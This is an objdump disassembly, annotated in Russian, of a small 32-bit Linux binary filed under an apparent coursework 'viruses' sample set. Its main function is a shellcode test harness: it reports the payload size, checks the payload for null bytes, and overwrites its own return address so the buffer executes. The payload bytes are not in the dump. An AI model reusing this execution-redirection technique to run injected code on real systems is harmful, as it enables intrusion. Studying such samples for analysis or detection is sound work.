
/home/stas/Coursach/Выборки/compiled/viruses/13381:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 03                	add    %al,(%ebx)
 8048199:	18 67 b5             	sbb    %ah,-0x4b(%edi)
 804819c:	0c ae                	or     $0xae,%al
 804819e:	06                   	push   %es
 804819f:	9b                   	fwait
 80481a0:	e5 57                	in     $0x57,%eax
 80481a2:	0b 50 8a             	or     -0x76(%eax),%edx
 80481a5:	1f                   	pop    %ds
 80481a6:	b4 97                	mov    $0x97,%ah
 80481a8:	3d                   	.byte 0x3d
 80481a9:	0e                   	push   %cs
 80481aa:	bd                   	.byte 0xbd
 80481ab:	b1                   	.byte 0xb1

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	06                   	push   %es
 80481b1:	00 00                	add    %al,(%eax)
 80481b3:	00 01                	add    %al,(%ecx)
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	20 00                	and    %al,(%eax)
 80481bf:	20 00                	and    %al,(%eax)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 06                	add    %al,(%esi)
 80481c5:	00 00                	add    %al,(%eax)
 80481c7:	00                   	.byte 0x0
 80481c8:	ad                   	lods   %ds:(%esi),%eax
 80481c9:	4b                   	dec    %ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x168>

Дизассемблирование раздела .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	1f                   	pop    %ds
	...
 80481e5:	00 00                	add    %al,(%eax)
 80481e7:	00 12                	add    %dl,(%edx)
 80481e9:	00 00                	add    %al,(%eax)
 80481eb:	00 1a                	add    %bl,(%edx)
	...
 80481f5:	00 00                	add    %al,(%eax)
 80481f7:	00 12                	add    %dl,(%edx)
 80481f9:	00 00                	add    %al,(%eax)
 80481fb:	00 3f                	add    %bh,(%edi)
	...
 8048205:	00 00                	add    %al,(%eax)
 8048207:	00 20                	add    %ah,(%eax)
 8048209:	00 00                	add    %al,(%eax)
 804820b:	00 2d 00 00 00 00    	add    %ch,0x0
 8048211:	00 00                	add    %al,(%eax)
 8048213:	00 00                	add    %al,(%eax)
 8048215:	00 00                	add    %al,(%eax)
 8048217:	00 12                	add    %dl,(%edx)
 8048219:	00 00                	add    %al,(%eax)
 804821b:	00 26                	add    %ah,(%esi)
	...
 8048225:	00 00                	add    %al,(%eax)
 8048227:	00 12                	add    %dl,(%edx)
 8048229:	00 00                	add    %al,(%eax)
 804822b:	00 0b                	add    %cl,(%ebx)
 804822d:	00 00                	add    %al,(%eax)
 804822f:	00 9c 85 04 08 04 00 	add    %bl,0x40804(%ebp,%eax,4)
 8048236:	00 00                	add    %al,(%eax)
 8048238:	11 00                	adc    %eax,(%eax)
 804823a:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

0804823c <.dynstr>:
 804823c:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048240:	63 2e                	arpl   %bp,(%esi)
 8048242:	73 6f                	jae    80482b3 <_init-0x41>
 8048244:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 8048249:	4f                   	dec    %edi
 804824a:	5f                   	pop    %edi
 804824b:	73 74                	jae    80482c1 <_init-0x33>
 804824d:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048254:	64 
 8048255:	00 70 75             	add    %dh,0x75(%eax)
 8048258:	74 73                	je     80482cd <_init-0x27>
 804825a:	00 70 72             	add    %dh,0x72(%eax)
 804825d:	69 6e 74 66 00 6d 65 	imul   $0x656d0066,0x74(%esi),%ebp
 8048264:	6d                   	insl   (%dx),%es:(%edi)
 8048265:	6d                   	insl   (%dx),%es:(%edi)
 8048266:	65                   	gs
 8048267:	6d                   	insl   (%dx),%es:(%edi)
 8048268:	00 5f 5f             	add    %bl,0x5f(%edi)
 804826b:	6c                   	insb   (%dx),%es:(%edi)
 804826c:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 8048273:	72 74                	jb     80482e9 <_init-0xb>
 8048275:	5f                   	pop    %edi
 8048276:	6d                   	insl   (%dx),%es:(%edi)
 8048277:	61                   	popa   
 8048278:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 804827f:	6f                   	outsl  %ds:(%esi),(%dx)
 8048280:	6e                   	outsb  %ds:(%esi),(%dx)
 8048281:	5f                   	pop    %edi
 8048282:	73 74                	jae    80482f8 <_init+0x4>
 8048284:	61                   	popa   
 8048285:	72 74                	jb     80482fb <_init+0x7>
 8048287:	5f                   	pop    %edi
 8048288:	5f                   	pop    %edi
 8048289:	00 47 4c             	add    %al,0x4c(%edi)
 804828c:	49                   	dec    %ecx
 804828d:	42                   	inc    %edx
 804828e:	43                   	inc    %ebx
 804828f:	5f                   	pop    %edi
 8048290:	32 2e                	xor    (%esi),%ch
 8048292:	30 00                	xor    %al,(%eax)

Дизассемблирование раздела .gnu.version:

08048294 <.gnu.version>:
 8048294:	00 00                	add    %al,(%eax)
 8048296:	02 00                	add    (%eax),%al
 8048298:	02 00                	add    (%eax),%al
 804829a:	00 00                	add    %al,(%eax)
 804829c:	02 00                	add    (%eax),%al
 804829e:	02 00                	add    (%eax),%al
 80482a0:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

080482a4 <.gnu.version_r>:
 80482a4:	01 00                	add    %eax,(%eax)
 80482a6:	01 00                	add    %eax,(%eax)
 80482a8:	01 00                	add    %eax,(%eax)
 80482aa:	00 00                	add    %al,(%eax)
 80482ac:	10 00                	adc    %al,(%eax)
 80482ae:	00 00                	add    %al,(%eax)
 80482b0:	00 00                	add    %al,(%eax)
 80482b2:	00 00                	add    %al,(%eax)
 80482b4:	10 69 69             	adc    %ch,0x69(%ecx)
 80482b7:	0d 00 00 02 00       	or     $0x20000,%eax
 80482bc:	4e                   	dec    %esi
 80482bd:	00 00                	add    %al,(%eax)
 80482bf:	00 00                	add    %al,(%eax)
 80482c1:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .rel.dyn:

080482c4 <.rel.dyn>:
 80482c4:	fc                   	cld    
 80482c5:	9f                   	lahf   
 80482c6:	04 08                	add    $0x8,%al
 80482c8:	06                   	push   %es
 80482c9:	03 00                	add    (%eax),%eax
	...

Дизассемблирование раздела .rel.plt:

080482cc <.rel.plt>:
 80482cc:	0c a0                	or     $0xa0,%al
 80482ce:	04 08                	add    $0x8,%al
 80482d0:	07                   	pop    %es
 80482d1:	01 00                	add    %eax,(%eax)
 80482d3:	00 10                	add    %dl,(%eax)
 80482d5:	a0 04 08 07 02       	mov    0x2070804,%al
 80482da:	00 00                	add    %al,(%eax)
 80482dc:	14 a0                	adc    $0xa0,%al
 80482de:	04 08                	add    $0x8,%al
 80482e0:	07                   	pop    %es
 80482e1:	03 00                	add    (%eax),%eax
 80482e3:	00 18                	add    %bl,(%eax)
 80482e5:	a0 04 08 07 04       	mov    0x4070804,%al
 80482ea:	00 00                	add    %al,(%eax)
 80482ec:	1c a0                	sbb    $0xa0,%al
 80482ee:	04 08                	add    $0x8,%al
 80482f0:	07                   	pop    %es
 80482f1:	05                   	.byte 0x5
	...

Дизассемблирование раздела .init:

080482f4 <_init>:
 80482f4:	53                   	push   %ebx
 80482f5:	83 ec 08             	sub    $0x8,%esp
 80482f8:	e8 b3 00 00 00       	call   80483b0 <__x86.get_pc_thunk.bx>
 80482fd:	81 c3 03 1d 00 00    	add    $0x1d03,%ebx
 8048303:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 8048309:	85 c0                	test   %eax,%eax
 804830b:	74 05                	je     8048312 <_init+0x1e>
 804830d:	e8 3e 00 00 00       	call   8048350 <__gmon_start__@plt>
 8048312:	83 c4 08             	add    $0x8,%esp
 8048315:	5b                   	pop    %ebx
 8048316:	c3                   	ret    

Дизассемблирование раздела .plt:

08048320 <printf@plt-0x10>:
 8048320:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048326:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804832c:	00 00                	add    %al,(%eax)
	...

08048330 <printf@plt>:
 8048330:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048336:	68 00 00 00 00       	push   $0x0
 804833b:	e9 e0 ff ff ff       	jmp    8048320 <_init+0x2c>

08048340 <puts@plt>:
 8048340:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048346:	68 08 00 00 00       	push   $0x8
 804834b:	e9 d0 ff ff ff       	jmp    8048320 <_init+0x2c>

08048350 <__gmon_start__@plt>:
 8048350:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048356:	68 10 00 00 00       	push   $0x10
 804835b:	e9 c0 ff ff ff       	jmp    8048320 <_init+0x2c>

08048360 <__libc_start_main@plt>:
 8048360:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048366:	68 18 00 00 00       	push   $0x18
 804836b:	e9 b0 ff ff ff       	jmp    8048320 <_init+0x2c>

08048370 <memmem@plt>:
 8048370:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 8048376:	68 20 00 00 00       	push   $0x20
 804837b:	e9 a0 ff ff ff       	jmp    8048320 <_init+0x2c>

Дизассемблирование раздела .text:

08048380 <_start>:
 8048380:	31 ed                	xor    %ebp,%ebp
 8048382:	5e                   	pop    %esi
 8048383:	89 e1                	mov    %esp,%ecx
 8048385:	83 e4 f0             	and    $0xfffffff0,%esp
 8048388:	50                   	push   %eax
 8048389:	54                   	push   %esp
 804838a:	52                   	push   %edx
 804838b:	68 80 85 04 08       	push   $0x8048580
 8048390:	68 10 85 04 08       	push   $0x8048510
 8048395:	51                   	push   %ecx
 8048396:	56                   	push   %esi
 8048397:	68 7d 84 04 08       	push   $0x804847d
 804839c:	e8 bf ff ff ff       	call   8048360 <__libc_start_main@plt>
 80483a1:	f4                   	hlt    
 80483a2:	66 90                	xchg   %ax,%ax
 80483a4:	66 90                	xchg   %ax,%ax
 80483a6:	66 90                	xchg   %ax,%ax
 80483a8:	66 90                	xchg   %ax,%ax
 80483aa:	66 90                	xchg   %ax,%ax
 80483ac:	66 90                	xchg   %ax,%ax
 80483ae:	66 90                	xchg   %ax,%ax

080483b0 <__x86.get_pc_thunk.bx>:
 80483b0:	8b 1c 24             	mov    (%esp),%ebx
 80483b3:	c3                   	ret    
 80483b4:	66 90                	xchg   %ax,%ax
 80483b6:	66 90                	xchg   %ax,%ax
 80483b8:	66 90                	xchg   %ax,%ax
 80483ba:	66 90                	xchg   %ax,%ax
 80483bc:	66 90                	xchg   %ax,%ax
 80483be:	66 90                	xchg   %ax,%ax

080483c0 <deregister_tm_clones>:
 80483c0:	b8 2f a1 04 08       	mov    $0x804a12f,%eax
 80483c5:	2d 2c a1 04 08       	sub    $0x804a12c,%eax
 80483ca:	83 f8 06             	cmp    $0x6,%eax
 80483cd:	77 01                	ja     80483d0 <deregister_tm_clones+0x10>
 80483cf:	c3                   	ret    
 80483d0:	b8 00 00 00 00       	mov    $0x0,%eax
 80483d5:	85 c0                	test   %eax,%eax
 80483d7:	74 f6                	je     80483cf <deregister_tm_clones+0xf>
 80483d9:	55                   	push   %ebp
 80483da:	89 e5                	mov    %esp,%ebp
 80483dc:	83 ec 18             	sub    $0x18,%esp
 80483df:	c7 04 24 2c a1 04 08 	movl   $0x804a12c,(%esp)
 80483e6:	ff d0                	call   *%eax
 80483e8:	c9                   	leave  
 80483e9:	c3                   	ret    
 80483ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

080483f0 <register_tm_clones>:
 80483f0:	b8 2c a1 04 08       	mov    $0x804a12c,%eax
 80483f5:	2d 2c a1 04 08       	sub    $0x804a12c,%eax
 80483fa:	c1 f8 02             	sar    $0x2,%eax
 80483fd:	89 c2                	mov    %eax,%edx
 80483ff:	c1 ea 1f             	shr    $0x1f,%edx
 8048402:	01 d0                	add    %edx,%eax
 8048404:	d1 f8                	sar    %eax
 8048406:	75 01                	jne    8048409 <register_tm_clones+0x19>
 8048408:	c3                   	ret    
 8048409:	ba 00 00 00 00       	mov    $0x0,%edx
 804840e:	85 d2                	test   %edx,%edx
 8048410:	74 f6                	je     8048408 <register_tm_clones+0x18>
 8048412:	55                   	push   %ebp
 8048413:	89 e5                	mov    %esp,%ebp
 8048415:	83 ec 18             	sub    $0x18,%esp
 8048418:	89 44 24 04          	mov    %eax,0x4(%esp)
 804841c:	c7 04 24 2c a1 04 08 	movl   $0x804a12c,(%esp)
 8048423:	ff d2                	call   *%edx
 8048425:	c9                   	leave  
 8048426:	c3                   	ret    
 8048427:	89 f6                	mov    %esi,%esi
 8048429:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048430 <__do_global_dtors_aux>:
 8048430:	80 3d 2c a1 04 08 00 	cmpb   $0x0,0x804a12c
 8048437:	75 13                	jne    804844c <__do_global_dtors_aux+0x1c>
 8048439:	55                   	push   %ebp
 804843a:	89 e5                	mov    %esp,%ebp
 804843c:	83 ec 08             	sub    $0x8,%esp
 804843f:	e8 7c ff ff ff       	call   80483c0 <deregister_tm_clones>
 8048444:	c6 05 2c a1 04 08 01 	movb   $0x1,0x804a12c
 804844b:	c9                   	leave  
 804844c:	f3 c3                	repz ret 
 804844e:	66 90                	xchg   %ax,%ax

08048450 <frame_dummy>:
 8048450:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 8048455:	85 c0                	test   %eax,%eax
 8048457:	74 1f                	je     8048478 <frame_dummy+0x28>
 8048459:	b8 00 00 00 00       	mov    $0x0,%eax
 804845e:	85 c0                	test   %eax,%eax
 8048460:	74 16                	je     8048478 <frame_dummy+0x28>
 8048462:	55                   	push   %ebp
 8048463:	89 e5                	mov    %esp,%ebp
 8048465:	83 ec 18             	sub    $0x18,%esp
 8048468:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 804846f:	ff d0                	call   *%eax
 8048471:	c9                   	leave  
 8048472:	e9 79 ff ff ff       	jmp    80483f0 <register_tm_clones>
 8048477:	90                   	nop
 8048478:	e9 73 ff ff ff       	jmp    80483f0 <register_tm_clones>

0804847d <main>:
 804847d:	55                   	push   %ebp
 804847e:	89 e5                	mov    %esp,%ebp
 8048480:	83 e4 f0             	and    $0xfffffff0,%esp
 8048483:	83 ec 20             	sub    $0x20,%esp
 8048486:	c6 44 24 1b 00       	movb   $0x0,0x1b(%esp)
 804848b:	c7 44 24 04 ec 00 00 	movl   $0xec,0x4(%esp)
 8048492:	00 
 8048493:	c7 04 24 a0 85 04 08 	movl   $0x80485a0,(%esp)
 804849a:	e8 91 fe ff ff       	call   8048330 <printf@plt>
 804849f:	c7 04 24 b4 85 04 08 	movl   $0x80485b4,(%esp)
 80484a6:	e8 85 fe ff ff       	call   8048330 <printf@plt>
 80484ab:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
 80484b2:	00 
 80484b3:	8d 44 24 1b          	lea    0x1b(%esp),%eax
 80484b7:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484bb:	c7 44 24 04 ec 00 00 	movl   $0xec,0x4(%esp)
 80484c2:	00 
 80484c3:	c7 04 24 40 a0 04 08 	movl   $0x804a040,(%esp)
 80484ca:	e8 a1 fe ff ff       	call   8048370 <memmem@plt>
 80484cf:	85 c0                	test   %eax,%eax
 80484d1:	75 0e                	jne    80484e1 <main+0x64>
 80484d3:	c7 04 24 c5 85 04 08 	movl   $0x80485c5,(%esp)
 80484da:	e8 61 fe ff ff       	call   8048340 <puts@plt>
 80484df:	eb 0c                	jmp    80484ed <main+0x70>
 80484e1:	c7 04 24 c9 85 04 08 	movl   $0x80485c9,(%esp)
 80484e8:	e8 53 fe ff ff       	call   8048340 <puts@plt>
 80484ed:	8d 44 24 1c          	lea    0x1c(%esp),%eax
 80484f1:	83 c0 08             	add    $0x8,%eax
 80484f4:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 80484f8:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80484fc:	ba 40 a0 04 08       	mov    $0x804a040,%edx
 8048501:	89 10                	mov    %edx,(%eax)
 8048503:	c9                   	leave  
 8048504:	c3                   	ret    
 8048505:	66 90                	xchg   %ax,%ax
 8048507:	66 90                	xchg   %ax,%ax
 8048509:	66 90                	xchg   %ax,%ax
 804850b:	66 90                	xchg   %ax,%ax
 804850d:	66 90                	xchg   %ax,%ax
 804850f:	90                   	nop

08048510 <__libc_csu_init>:
 8048510:	55                   	push   %ebp
 8048511:	57                   	push   %edi
 8048512:	31 ff                	xor    %edi,%edi
 8048514:	56                   	push   %esi
 8048515:	53                   	push   %ebx
 8048516:	e8 95 fe ff ff       	call   80483b0 <__x86.get_pc_thunk.bx>
 804851b:	81 c3 e5 1a 00 00    	add    $0x1ae5,%ebx
 8048521:	83 ec 1c             	sub    $0x1c,%esp
 8048524:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 8048528:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804852e:	e8 c1 fd ff ff       	call   80482f4 <_init>
 8048533:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 8048539:	29 c6                	sub    %eax,%esi
 804853b:	c1 fe 02             	sar    $0x2,%esi
 804853e:	85 f6                	test   %esi,%esi
 8048540:	74 27                	je     8048569 <__libc_csu_init+0x59>
 8048542:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048548:	8b 44 24 38          	mov    0x38(%esp),%eax
 804854c:	89 2c 24             	mov    %ebp,(%esp)
 804854f:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048553:	8b 44 24 34          	mov    0x34(%esp),%eax
 8048557:	89 44 24 04          	mov    %eax,0x4(%esp)
 804855b:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 8048562:	83 c7 01             	add    $0x1,%edi
 8048565:	39 f7                	cmp    %esi,%edi
 8048567:	75 df                	jne    8048548 <__libc_csu_init+0x38>
 8048569:	83 c4 1c             	add    $0x1c,%esp
 804856c:	5b                   	pop    %ebx
 804856d:	5e                   	pop    %esi
 804856e:	5f                   	pop    %edi
 804856f:	5d                   	pop    %ebp
 8048570:	c3                   	ret    
 8048571:	eb 0d                	jmp    8048580 <__libc_csu_fini>
 8048573:	90                   	nop
 8048574:	90                   	nop
 8048575:	90                   	nop
 8048576:	90                   	nop
 8048577:	90                   	nop
 8048578:	90                   	nop
 8048579:	90                   	nop
 804857a:	90                   	nop
 804857b:	90                   	nop
 804857c:	90                   	nop
 804857d:	90                   	nop
 804857e:	90                   	nop
 804857f:	90                   	nop

08048580 <__libc_csu_fini>:
 8048580:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

08048584 <_fini>:
 8048584:	53                   	push   %ebx
 8048585:	83 ec 08             	sub    $0x8,%esp
 8048588:	e8 23 fe ff ff       	call   80483b0 <__x86.get_pc_thunk.bx>
 804858d:	81 c3 73 1a 00 00    	add    $0x1a73,%ebx
 8048593:	83 c4 08             	add    $0x8,%esp
 8048596:	5b                   	pop    %ebx
 8048597:	c3                   	ret    

Дизассемблирование раздела .rodata:

08048598 <_fp_hw>:
 8048598:	03 00                	add    (%eax),%eax
	...

0804859c <_IO_stdin_used>:
 804859c:	01 00                	add    %eax,(%eax)
 804859e:	02 00                	add    (%eax),%al
 80485a0:	73 68                	jae    804860a <_IO_stdin_used+0x6e>
 80485a2:	65                   	gs
 80485a3:	6c                   	insb   (%dx),%es:(%edi)
 80485a4:	6c                   	insb   (%dx),%es:(%edi)
 80485a5:	63 6f 64             	arpl   %bp,0x64(%edi)
 80485a8:	65                   	gs
 80485a9:	5f                   	pop    %edi
 80485aa:	73 69                	jae    8048615 <_IO_stdin_used+0x79>
 80485ac:	7a 65                	jp     8048613 <_IO_stdin_used+0x77>
 80485ae:	3a 20                	cmp    (%eax),%ah
 80485b0:	25 75 0a 00 63       	and    $0x63000a75,%eax
 80485b5:	6f                   	outsl  %ds:(%esi),(%dx)
 80485b6:	6e                   	outsb  %ds:(%esi),(%dx)
 80485b7:	74 61                	je     804861a <_IO_stdin_used+0x7e>
 80485b9:	69 6e 73 20 6e 75 6c 	imul   $0x6c756e20,0x73(%esi),%ebp
 80485c0:	6c                   	insb   (%dx),%es:(%edi)
 80485c1:	73 3a                	jae    80485fd <_IO_stdin_used+0x61>
 80485c3:	20 00                	and    %al,(%eax)
 80485c5:	79 65                	jns    804862c <_IO_stdin_used+0x90>
 80485c7:	73 00                	jae    80485c9 <_IO_stdin_used+0x2d>
 80485c9:	6e                   	outsb  %ds:(%esi),(%dx)
 80485ca:	6f                   	outsl  %ds:(%esi),(%dx)
	...

Дизассемблирование раздела .eh_frame_hdr:

080485cc <.eh_frame_hdr>:
 80485cc:	01 1b                	add    %ebx,(%ebx)
 80485ce:	03 3b                	add    (%ebx),%edi
 80485d0:	28 00                	sub    %al,(%eax)
 80485d2:	00 00                	add    %al,(%eax)
 80485d4:	04 00                	add    $0x0,%al
 80485d6:	00 00                	add    %al,(%eax)
 80485d8:	54                   	push   %esp
 80485d9:	fd                   	std    
 80485da:	ff                   	(bad)  
 80485db:	ff 44 00 00          	incl   0x0(%eax,%eax,1)
 80485df:	00 b1 fe ff ff 68    	add    %dh,0x68fffffe(%ecx)
 80485e5:	00 00                	add    %al,(%eax)
 80485e7:	00 44 ff ff          	add    %al,-0x1(%edi,%edi,8)
 80485eb:	ff 88 00 00 00 b4    	decl   -0x4c000000(%eax)
 80485f1:	ff                   	(bad)  
 80485f2:	ff                   	(bad)  
 80485f3:	ff c4                	inc    %esp
 80485f5:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

080485f8 <__FRAME_END__-0xac>:
 80485f8:	14 00                	adc    $0x0,%al
 80485fa:	00 00                	add    %al,(%eax)
 80485fc:	00 00                	add    %al,(%eax)
 80485fe:	00 00                	add    %al,(%eax)
 8048600:	01 7a 52             	add    %edi,0x52(%edx)
 8048603:	00 01                	add    %al,(%ecx)
 8048605:	7c 08                	jl     804860f <_IO_stdin_used+0x73>
 8048607:	01 1b                	add    %ebx,(%ebx)
 8048609:	0c 04                	or     $0x4,%al
 804860b:	04 88                	add    $0x88,%al
 804860d:	01 00                	add    %eax,(%eax)
 804860f:	00 20                	add    %ah,(%eax)
 8048611:	00 00                	add    %al,(%eax)
 8048613:	00 1c 00             	add    %bl,(%eax,%eax,1)
 8048616:	00 00                	add    %al,(%eax)
 8048618:	08 fd                	or     %bh,%ch
 804861a:	ff                   	(bad)  
 804861b:	ff 60 00             	jmp    *0x0(%eax)
 804861e:	00 00                	add    %al,(%eax)
 8048620:	00 0e                	add    %cl,(%esi)
 8048622:	08 46 0e             	or     %al,0xe(%esi)
 8048625:	0c 4a                	or     $0x4a,%al
 8048627:	0f 0b                	ud2    
 8048629:	74 04                	je     804862f <_IO_stdin_used+0x93>
 804862b:	78 00                	js     804862d <_IO_stdin_used+0x91>
 804862d:	3f                   	aas    
 804862e:	1a 3b                	sbb    (%ebx),%bh
 8048630:	2a 32                	sub    (%edx),%dh
 8048632:	24 22                	and    $0x22,%al
 8048634:	1c 00                	sbb    $0x0,%al
 8048636:	00 00                	add    %al,(%eax)
 8048638:	40                   	inc    %eax
 8048639:	00 00                	add    %al,(%eax)
 804863b:	00 41 fe             	add    %al,-0x2(%ecx)
 804863e:	ff                   	(bad)  
 804863f:	ff 88 00 00 00 00    	decl   0x0(%eax)
 8048645:	41                   	inc    %ecx
 8048646:	0e                   	push   %cs
 8048647:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 804864d:	02 84 c5 0c 04 04 00 	add    0x4040c(%ebp,%eax,8),%al
 8048654:	38 00                	cmp    %al,(%eax)
 8048656:	00 00                	add    %al,(%eax)
 8048658:	60                   	pusha  
 8048659:	00 00                	add    %al,(%eax)
 804865b:	00 b4 fe ff ff 61 00 	add    %dh,0x61ffff(%esi,%edi,8)
 8048662:	00 00                	add    %al,(%eax)
 8048664:	00 41 0e             	add    %al,0xe(%ecx)
 8048667:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 804866d:	87 03                	xchg   %eax,(%ebx)
 804866f:	43                   	inc    %ebx
 8048670:	0e                   	push   %cs
 8048671:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 8048677:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 804867e:	0e                   	push   %cs
 804867f:	14 41                	adc    $0x41,%al
 8048681:	c3                   	ret    
 8048682:	0e                   	push   %cs
 8048683:	10 41 c6             	adc    %al,-0x3a(%ecx)
 8048686:	0e                   	push   %cs
 8048687:	0c 41                	or     $0x41,%al
 8048689:	c7                   	(bad)  
 804868a:	0e                   	push   %cs
 804868b:	08 41 c5             	or     %al,-0x3b(%ecx)
 804868e:	0e                   	push   %cs
 804868f:	04 10                	add    $0x10,%al
 8048691:	00 00                	add    %al,(%eax)
 8048693:	00 9c 00 00 00 e8 fe 	add    %bl,-0x1180000(%eax,%eax,1)
 804869a:	ff                   	(bad)  
 804869b:	ff 02                	incl   (%edx)
 804869d:	00 00                	add    %al,(%eax)
 804869f:	00 00                	add    %al,(%eax)
 80486a1:	00 00                	add    %al,(%eax)
	...

080486a4 <__FRAME_END__>:
 80486a4:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	50                   	push   %eax
 8049f09:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	30                   	.byte 0x30
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	f4                   	hlt    
 8049f21:	82                   	(bad)  
 8049f22:	04 08                	add    $0x8,%al
 8049f24:	0d 00 00 00 84       	or     $0x84000000,%eax
 8049f29:	85 04 08             	test   %eax,(%eax,%ecx,1)
 8049f2c:	19 00                	sbb    %eax,(%eax)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	3c 82                	cmp    $0x82,%al
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
 8049f5f:	00 cc                	add    %cl,%ah
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	58                   	pop    %eax
 8049f69:	00 00                	add    %al,(%eax)
 8049f6b:	00 0b                	add    %cl,(%ebx)
 8049f6d:	00 00                	add    %al,(%eax)
 8049f6f:	00 10                	add    %dl,(%eax)
 8049f71:	00 00                	add    %al,(%eax)
 8049f73:	00 15 00 00 00 00    	add    %dl,0x0
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
